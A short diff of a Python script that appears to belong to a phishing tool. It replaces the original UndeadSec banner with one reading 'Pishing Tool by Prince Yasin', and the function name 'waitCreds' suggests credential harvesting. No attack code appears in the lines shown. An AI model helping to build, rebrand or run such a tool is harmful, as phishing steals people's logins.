@@ -101,7 +101,8 @@ def waitCreds():
 
 def runPEnv():
     system('clear')
-    print '''           {2}-{1} UNDEADSEC {2}|{1} t.me/UndeadSec {2}|{1} youtube.com/c/UndeadSec {2}- BRAZIL
+
+    print '''           {2}-{1} Pishing Tool by Prince Yasin 
                           '
                         '   '
                       '       '
